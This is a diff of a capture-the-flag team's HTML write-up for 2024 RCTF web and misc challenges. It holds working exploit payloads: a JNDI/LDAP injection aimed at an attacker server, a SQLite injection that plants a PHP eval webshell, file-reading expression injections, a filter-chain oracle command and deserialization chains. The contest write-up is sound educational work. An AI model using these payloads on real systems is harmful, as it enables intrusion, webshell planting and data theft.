@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -14,7 +14,8 @@
 
       <title>2024 RCTF SU WriteUp - su-team</title>
 
-  <meta name="description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。
+  <meta name="description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系书鱼 QQ:381382770。
 以下是我们 SU 本次 2024 RCTF的 writeup。">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
@@ -66,7 +67,7 @@
   "headline": "2024 RCTF SU WriteUp",
   "description" : "本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。\n以下是我们 SU 本次 2024 RCTF的 writeup。\n",
   "inLanguage" : "en",
-  "wordCount":  2674 ,
+  "wordCount":  2675 ,
   "datePublished" : "2024-05-27T23:15:34\u002b08:00",
   "dateModified" : "2024-05-27T23:15:34\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -87,7 +88,8 @@
 
 
 <meta property="og:title" content="2024 RCTF SU WriteUp" />
-<meta property="og:description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。
+<meta property="og:description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系书鱼 QQ:381382770。
 以下是我们 SU 本次 2024 RCTF的 writeup。">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/rctf-2024-su-wu/" />
@@ -95,7 +97,8 @@
 <meta property="og:site_name" content="su-team" />
 
   <meta name="twitter:title" content="2024 RCTF SU WriteUp" />
-  <meta name="twitter:description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。
+  <meta name="twitter:description" content="本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系书鱼 QQ:381382770。
 以下是我们 SU 本次 2024 RCTF的 writeup。">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -319,7 +322,7 @@
     &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;13&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2674&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2675&nbsp;words
   
   
     
@@ -400,31 +403,87 @@
 
         <section class="article-shell">
           <article role="main" class="blog-post">
-            <p>本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href="mailto:xctf@126.com">xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
+            <p>本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href="mailto:xctf@126.com">xctf@126.com</a>
+ 或者直接联系书鱼 QQ:381382770。</p>
 <p>以下是我们 SU 本次 2024 RCTF的 writeup。</p>
 <h1 id="web">web</h1>
 <h2 id="openyoureyestoseetheworld">OpenYourEyesToSeeTheWorld</h2>
 <p>根据题目源码易知是JNDI中的LDAP注入</p>
-<p><img src="/img/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/46c26df9a8577c9cdf77aae4af49f1f1.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>查看容器中java版本，高版本一般都是打反序列化</p>
-<p><img src="/img/2024-05-27-RCTF/09dbc0f7779d7896470f8ffc876d936d.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/09dbc0f7779d7896470f8ffc876d936d.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>依赖只有SpringBoot，那只剩下Jackson原生反序列化这条链子</p>
-<p><img src="/img/2024-05-27-RCTF/1ae88573acbc157fb7bf1443a68dcb25.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/1ae88573acbc157fb7bf1443a68dcb25.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>而如何触发obj.decodeObject()方法 和 绕过检测成了关键</p>
-<p><img src="/img/2024-05-27-RCTF/65e10ec43957abff3dbb183248e33bd3.png" alt="img"></p>
-<p><img src="/img/2024-05-27-RCTF/421edc7a9ebe6cf69aa23245d5d0ea01.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/65e10ec43957abff3dbb183248e33bd3.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/421edc7a9ebe6cf69aa23245d5d0ea01.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>绕过检测可以用Unicode编码绕过例如<code>\u003d</code> 替代 <code>=</code>等</p>
 <p>obj.decodeObject()方法有三处调用</p>
-<p><img src="/img/2024-05-27-RCTF/ffdea279dbcf5db7ff9c077e7124e3f5.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/ffdea279dbcf5db7ff9c077e7124e3f5.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>c_lookup() 方法有5处调用</p>
-<p><img src="/img/2024-05-27-RCTF/511dc91db5ed3d0b02f1151d7a97bf92.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/511dc91db5ed3d0b02f1151d7a97bf92.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>c_resolveIntermediate_nns() 方法有3处调用</p>
-<p><img src="/img/2024-05-27-RCTF/54f66b7db91c9b25a2942b01953f7055.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/54f66b7db91c9b25a2942b01953f7055.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>动调发现正常的payload 无法达到 c_resolveIntermediate_nns() 方法，因为tail 变量为空</p>
-<p><img src="/img/2024-05-27-RCTF/caefee5ee6854594b0e273f148ddbc46.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/caefee5ee6854594b0e273f148ddbc46.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>进入p_parseComponent() 方法，查看tail 属性的解析</p>
-<p><img src="/img/2024-05-27-RCTF/a2d3802e41f4223abd0262e4f48937a0.png" alt="img"></p>
-<p><img src="/img/2024-05-27-RCTF/88465060dc6397b6e62a5bfca4b1d89f.png" alt="img"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/a2d3802e41f4223abd0262e4f48937a0.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/88465060dc6397b6e62a5bfca4b1d89f.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>了解这些后，即可构造payload了</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;ip&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;vps&gt;&#34;</span><span class="p">,</span><span class="nt">&#34;port&#34;</span><span class="p">:</span><span class="mi">9999</span><span class="p">,</span><span class="nt">&#34;searchBase&#34;</span><span class="p">:</span><span class="s2">&#34;dc\u003djavasec,dc\u003deki,dc\u003dxyz\u002f0&#34;</span><span class="p">,</span><span class="nt">&#34;filter&#34;</span><span class="p">:</span><span class="s2">&#34;\u0028cn\u003dtest\u0029&#34;</span><span class="p">}</span>
 </span></span></code></pre></div><p>生成链子的脚本</p>
@@ -494,12 +553,21 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>将生成好的链子放到HackerLDAPRefServer.java即可</p>
-<p><img src="/img/2024-05-27-RCTF/fb0da3743efd604bf45284812d2b5652.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/fb0da3743efd604bf45284812d2b5652.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>参考链接：</p>
-<p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a></p>
-<p><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
-<p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB</a></p>
-<p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a></p>
+<p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a>
+</p>
+<p><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a>
+</p>
+<p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB</a>
+</p>
+<p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a>
+</p>
 <h2 id="proxy">Proxy</h2>
 <p><code>Proxy.php</code>其中的<code>$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'];</code>可被伪造</p>
 <p>导致可以控制其返回内容</p>
@@ -509,14 +577,34 @@
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;a&#39;);ATTACH DATABASE &#39;/var/www/html/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php eval(\$_GET[1]);?&gt;&#39;);--&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">?&gt;
 </span></span></code></pre></div><p>修改Host头</p>
-<p><img src="/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/86aa97f47c21e02ec270422ab6341c24.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>访问<code>/shell.php?1=system('tac flag.php');</code></p>
-<p><img src="/img/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/c55273600d978e3c1f63652ef1e8013e.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h2 id="colorsolved">color(Solved)</h2>
 <p>Js反混淆分析</p>
-<p><img src="/img/2024-05-27-RCTF/c024ed1135e6e390d941dfa607010b77.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/c024ed1135e6e390d941dfa607010b77.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>先访问js然后f12找到加密解密函数然后打断点之后再访问根目录玩游戏可以看到密钥</p>
-<p><img src="/img/2024-05-27-RCTF/a.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/a.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>然后编写脚本玩游戏</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
@@ -586,9 +674,19 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="/img/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png" alt=""></p>
+</span></span></code></pre></div><p><img
+  src="/post/rctf-2024-su-wu/b78bb6863e56b1c86be4bfd3feb0a5d5.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>解密secret</p>
-<p><img src="/img/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/b78bb6863e56b1c86be4bfd3feb0a5d5.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>得到源码<code>secr3tcolor.zip</code></p>
 <p>下载下来，发现<code>final/game.php</code>中，其中<code>action</code>需要进行加密传送</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
@@ -608,8 +706,18 @@
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$upload_image</span><span class="p">);</span>
 </span></span></code></pre></div><p>存在侧信道漏洞，但是可控点在文件上传的内容</p>
 <p>基于https://github.com/synacktiv/php_filter_chains_oracle_exploit脚本进行修改</p>
-<p><img src="/img/2024-05-27-RCTF/cabab988fe4d41430594cfc3ae8c6511.png" alt=""></p>
-<p><img src="/img/2024-05-27-RCTF/7d652a7e19399a3c53683aa792a38bb7.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/cabab988fe4d41430594cfc3ae8c6511.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/7d652a7e19399a3c53683aa792a38bb7.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>运行即可</p>
 <p><code>python3 filters_ chain_ oracle_exploit.py --target url/final/game.php --verb POST --parameter 0 --file /flag.txt</code></p>
 <h2 id="what_-solved"><strong>what_is_love</strong> <strong>(Solved)</strong></h2>
@@ -638,10 +746,25 @@
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">j</span> <span class="o">==</span> <span class="s1">&#39;.&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="/img/2024-05-27-RCTF/c460eab80d6db0ff96dac59993a8ca9e.png" alt=""></p>
-<p><img src="/img/2024-05-27-RCTF/53f255d839ade35227ea9c02e782517b.png" alt=""></p>
+</span></span></code></pre></div><p><img
+  src="/post/rctf-2024-su-wu/c460eab80d6db0ff96dac59993a8ca9e.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/53f255d839ade35227ea9c02e782517b.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>key2当输入的love_time为字符串时，先经过Number函数处理之后就会变为NaN，然后再经过parseInt函数处理之后saltedSecret就会变为NaN，所以此时saltedSecret的值可控了，就可以用来伪造token了</p>
-<p><img src="/img/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/c55273600d978e3c1f63652ef1e8013e.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>伪造token</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">const</span> <span class="n">crypto</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s2">&#34;crypto&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">const</span> <span class="nb">hash</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">crypto</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s2">&#34;sha256&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">);</span>
@@ -649,28 +772,66 @@
 </span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">username</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">lover</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">love_time</span><span class="se">\&#34;</span><span class="s2">:null,</span><span class="se">\&#34;</span><span class="s2">have_lovers</span><span class="se">\&#34;</span><span class="s2">:true}&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">saltedSecret</span><span class="o">=</span><span class="n">NaN</span>
 </span></span><span class="line"><span class="cl"><span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">(</span><span class="err">`$</span><span class="p">{</span><span class="n">data</span><span class="p">}:</span><span class="err">$</span><span class="p">{</span><span class="n">saltedSecret</span><span class="p">}</span><span class="err">`</span><span class="p">))</span>
-</span></span></code></pre></div><p><img src="/img/2024-05-27-RCTF/25cc211d6b16c26d5e69e44f5042a2fc.png" alt=""></p>
+</span></span></code></pre></div><p><img
+  src="/post/rctf-2024-su-wu/25cc211d6b16c26d5e69e44f5042a2fc.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h2 id="nosandbox">nosandbox</h2>
 <p>JEXL 表达式注入 ，BAN 了很多东西<br>
 根据官方文档 能利用的 只有new 创建新实例，没有T() 类型表达式，而new() 也被ban了，但是可以通过加空格new () 进行绕过</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528103919-7oq843z.png" alt="image"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528103919-7oq843z.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
 <p>根据一些之前<code>SpEL表达式注入</code>​ 的 payload ，构造出如下payload读取 <strong>​<code>/proc/self/cmdline</code>​</strong>​</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="cl"><span class="n">expression</span><span class="o">=</span><span class="k">new</span><span class="o">+</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="err">&#39;</span><span class="p">,</span><span class="k">new</span><span class="o">+</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">FileReader</span><span class="sc">&#39;,&#39;</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">cmdline</span><span class="err">&#39;</span><span class="p">)).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="err">&#39;\\</span><span class="n">Z</span><span class="err">&#39;</span><span class="p">).</span><span class="na">next</span><span class="p">()</span><span class="w">
-</span></span></span></code></pre></div><p><img src="/img/2024-05-27-RCTF/image-20240528104010-f8x2byk.png" alt="image"></p>
+</span></span></span></code></pre></div><p><img
+  src="/post/rctf-2024-su-wu/image-20240528104010-f8x2byk.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
 <p>读取<code>nosandbox.jar</code>​ 但因为存在编码问题，无法反编译，但可以看到其依赖</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104020-d8i3qhc.png" alt="image"></p>
-<p>根据**<a href="https://landgrey.me/blog/15/">LandGrey师傅文章</a>** 思路，表达式注入也能打反序列化</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104029-f0db870.png" alt="image"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104020-d8i3qhc.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
+<p>根据**<a href="https://landgrey.me/blog/15/">LandGrey师傅文章</a>
+** 思路，表达式注入也能打反序列化</p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104029-f0db870.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
 <p>但其中调用静态方法 <code>org.springframework.util.SerializationUtils.deserialize</code>​ 反序列化思路，我用 JEXL 表达式我想不出如何能调用，只能去寻找写文件再反序列化读取的方法</p>
-<p>看到<a href="https://github.com/achuna33/Memoryshell-JavaALL">Memoryshell-JavaALL</a> 项目发现可以用如下表达式将字符串写入文件</p>
+<p>看到<a href="https://github.com/achuna33/Memoryshell-JavaALL">Memoryshell-JavaALL</a>
+ 项目发现可以用如下表达式将字符串写入文件</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="p">{</span><span class="s">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()(</span><span class="s">&#34;java.io.FileWriter&#34;</span><span class="p">,</span><span class="s">&#34;/tmp/hh.txt&#34;</span><span class="p">).</span><span class="na">append</span><span class="p">(</span><span class="s">&#34;&lt;&gt;&#34;</span><span class="p">).</span><span class="na">close</span><span class="p">()}</span><span class="w">
 </span></span></span></code></pre></div><p>我一开始是将序列化数据进行Unicode编码成字符串再写入，但是存在写入文件与源文件不一致问题</p>
 <p>向调用其他方法，在JEXL 表达式中我也想不出实例化<code>byte[]</code>​ 数组方法，因为<code>[]</code>​ 它会自动执行类型转换</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104211-b4ois2b.png" alt="image"></p>
-<p>通过一番寻找后 终于在<a href="https://docs.oracle.com/javase/8/docs/api/java/io/DataOutputStream.html">官方文档</a> 找到了DataOutputStream.write(int b) 方法，用int 型就能写入数据</p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104211-b4ois2b.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
+<p>通过一番寻找后 终于在<a href="https://docs.oracle.com/javase/8/docs/api/java/io/DataOutputStream.html">官方文档</a>
+ 找到了DataOutputStream.write(int b) 方法，用int 型就能写入数据</p>
 <p>一开始用的是jackson原生反序列化这条。链，打了两遍都没成功</p>
 <p>遂改用P神的CC6链子</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104218-n89rt30.png" alt="image"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104218-n89rt30.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
 <p>编写py脚本，写入数据</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
@@ -697,12 +858,32 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
 </span></span></code></pre></div><p>再用如下payload即可读取文件反序列化</p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104237-t4btbiw.png" alt="image"></p>
-<p><img src="/img/2024-05-27-RCTF/image-20240528104241-1htoamp.png" alt="image"></p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104237-t4btbiw.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/image-20240528104241-1htoamp.png"
+  alt="image"
+  loading="lazy"
+>
+</p>
 <h1 id="misc">misc</h1>
 <h2 id="logo-signin-solved">Logo: Signin (Solved)</h2>
-<p><img src="/img/2024-05-27-RCTF/e929385cbdd238f4d6d62dcd12872cdb.png" alt=""></p>
-<p><img src="/img/2024-05-27-RCTF/e1b235340242f6fbb7d46a4c82e6432a.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/e929385cbdd238f4d6d62dcd12872cdb.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/rctf-2024-su-wu/e1b235340242f6fbb7d46a4c82e6432a.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell"><span class="line"><span class="cl"><span class="nv">logo</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
 </span></span></span><span class="line"><span class="cl"><span class="s2">####################################################################################################
 </span></span></span><span class="line"><span class="cl"><span class="s2">############################ # #####################################################################
@@ -729,9 +910,19 @@
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
 </span></span></code></pre></div><h2 id="s1ayth3sp1re-solved">s1ayth3sp1re (Solved)</h2>
 <p>根据分数 3000 分来，使用jadx反编译. 搜索 3000。在代码中。找到 相关的比较.</p>
-<p><img src="/img/2024-05-27-RCTF/bbf3f404a640adef521efd8c4cdfc7ad.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/bbf3f404a640adef521efd8c4cdfc7ad.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>跳过去发现 是一段字符串加密:</p>
-<p><img src="/img/2024-05-27-RCTF/7da9e6da6a62dedcc190228819151942.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/7da9e6da6a62dedcc190228819151942.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>其中有一些引用，找到之后，写加密脚本:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="mi">164</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">236</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">85</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">l1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">246</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">127</span> <span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">40</span><span class="p">]</span>
@@ -1011,20 +1202,55 @@
 </span></span></span><span class="line"><span class="cl"><span class="cm">EXCEPTION_INT_DIVIDE_BY_ZERO
 </span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
